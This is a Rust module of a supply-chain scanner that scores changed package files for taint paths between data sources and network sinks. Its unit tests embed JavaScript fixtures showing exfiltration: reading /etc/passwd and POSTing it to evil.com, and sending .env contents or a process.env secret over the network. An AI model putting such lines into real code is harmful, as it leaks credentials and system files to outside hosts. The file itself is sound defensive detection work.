//! TaintDetection: Tier 2 signal built from analysis::pattern::matcher output.
//!
//! Scoring (cap 0.50 across all TaintDetection emissions):
//!   SameScopePath (source+sink within 30 lines, new in version)  → 0.35
//!   VariableFlow  (source var name appears in sink, new)          → 0.30
//!   FileCoOccurrence (both in file, no proximity/flow, new)       → 0.15
//!   LoneSourceOrSink (only one of source/sink, new in version)    → 0.05
//!
//! "New in version" is gated by the caller: only changed files are passed
//! here, and if >80% of files changed the caller should also flag
//! `is_wholesale_repackage` and downgrade (or skip) the new-in-version
//! bonuses to suppress false positives on bundler repackaging.

use crate::analysis::manifest::ChangedFile;
use crate::analysis::pattern::{scan_file, FileFindings, PatternSet};
use crate::types::{Signal, TaintKind};

pub const CAP: f64 = 0.50;

pub struct ScanResult {
    pub signals: Vec<Signal>,
    pub findings: Vec<FileFindings>,
}

pub fn scan(
    changed: &[ChangedFile],
    patterns: &dyn Fn(crate::analysis::pattern::Language) -> PatternSet,
    is_wholesale_repackage: bool,
) -> ScanResult {
    let mut signals: Vec<Signal> = Vec::new();
    let mut findings: Vec<FileFindings> = Vec::new();
    for file in changed {
        let set = patterns(file.language);
        let f = scan_file(&file.rel_path, file.language, &file.content, &set);
        classify(&f, &mut signals, is_wholesale_repackage);
        findings.push(f);
    }
    ScanResult { signals, findings }
}

fn classify(f: &FileFindings, out: &mut Vec<Signal>, wholesale: bool) {
    let mut emitted_primary = false;
    if !f.taint_paths.is_empty() {
        let detail = format!(
            "{} taint path(s); closest distance={}",
            f.taint_paths.len(),
            f.taint_paths.iter().map(|p| p.distance).min().unwrap_or(0)
        );
        out.push(Signal::TaintDetection {
            kind: TaintKind::SameScopePath,
            file: f.file.clone(),
            detail,
        });
        emitted_primary = true;
    }
    if !f.variable_flows.is_empty() {
        let vars: Vec<&str> = f
            .variable_flows
            .iter()
            .map(|v| v.variable.as_str())
            .collect();
        out.push(Signal::TaintDetection {
            kind: TaintKind::VariableFlow,
            file: f.file.clone(),
            detail: format!("variables: {}", vars.join(",")),
        });
        emitted_primary = true;
    }
    if !emitted_primary && f.has_co_occurrence {
        out.push(Signal::TaintDetection {
            kind: TaintKind::FileCoOccurrence,
            file: f.file.clone(),
            detail: format!(
                "sources={} sinks={} (no proximity/flow)",
                f.source_matches.len(),
                f.sink_matches.len()
            ),
        });
    } else if !emitted_primary
        && !f.has_co_occurrence
        && (!f.source_matches.is_empty() ^ !f.sink_matches.is_empty())
    {
        out.push(Signal::TaintDetection {
            kind: TaintKind::LoneSourceOrSink,
            file: f.file.clone(),
            detail: format!(
                "sources={} sinks={}",
                f.source_matches.len(),
                f.sink_matches.len()
            ),
        });
    }
    let _ = wholesale;
}

pub fn total_taint_score(signals: &[Signal]) -> f64 {
    let sum: f64 = signals
        .iter()
        .filter(|s| matches!(s, Signal::TaintDetection { .. }))
        .map(|s| s.weight())
        .sum();
    sum.min(CAP)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analysis::pattern::Language;
    use std::path::PathBuf;

    fn builtin(lang: Language) -> PatternSet {
        PatternSet::builtin(lang)
    }

    fn make_changed(rel: &str, language: Language, content: &str) -> ChangedFile {
        ChangedFile {
            rel_path: rel.to_string(),
            abs_path: PathBuf::from(rel),
            language,
            content: content.to_string(),
            sha256: "x".into(),
            previously_existed: false,
        }
    }

    #[test]
    fn nx_style_scenario_emits_same_scope_path() {
        let content = r#"
const envData = fs.readFileSync('/etc/passwd');
fetch('https://evil.com/exfil', {method: 'POST', body: envData});
"#;
        let changed = vec![make_changed("index.js", Language::JavaScript, content)];
        let r = scan(&changed, &builtin, false);
        assert!(
            r.signals.iter().any(|s| matches!(
                s,
                Signal::TaintDetection {
                    kind: TaintKind::SameScopePath,
                    ..
                }
            )),
            "signals = {:?}",
            r.signals
        );
        let score = total_taint_score(&r.signals);
        assert!(
            score >= 0.35,
            "expected score ≥ 0.35, got {score}: {:?}",
            r.signals
        );
    }

    #[test]
    fn variable_flow_emitted_when_present() {
        let content = r#"
const { SECRET } = process.env;
axios.post(url, SECRET);
"#;
        let changed = vec![make_changed("a.js", Language::JavaScript, content)];
        let r = scan(&changed, &builtin, false);
        assert!(r.signals.iter().any(|s| matches!(
            s,
            Signal::TaintDetection {
                kind: TaintKind::VariableFlow,
                ..
            }
        )));
    }

    #[test]
    fn clean_file_emits_no_signal() {
        let content = "export function add(a, b) { return a + b; }\n";
        let changed = vec![make_changed("math.js", Language::JavaScript, content)];
        let r = scan(&changed, &builtin, false);
        assert!(r.signals.is_empty(), "{:?}", r.signals);
    }

    #[test]
    fn lone_sink_scores_low() {
        let content = "fetch('/api/health');\n";
        let changed = vec![make_changed("health.js", Language::JavaScript, content)];
        let r = scan(&changed, &builtin, false);
        assert!(r.signals.iter().any(|s| matches!(
            s,
            Signal::TaintDetection {
                kind: TaintKind::LoneSourceOrSink,
                ..
            }
        )));
        assert!(total_taint_score(&r.signals) <= 0.05 + 1e-9);
    }

    #[test]
    fn cap_respected_across_multiple_files() {
        let content = r#"
const data = fs.readFileSync('.env');
fetch('http://x', {body: data});
"#;
        let changed: Vec<_> = (0..10)
            .map(|i| make_changed(&format!("f{i}.js"), Language::JavaScript, content))
            .collect();
        let r = scan(&changed, &builtin, false);
        let score = total_taint_score(&r.signals);
        assert!((score - CAP).abs() < 1e-9, "capped at {CAP}, got {score}");
    }
}
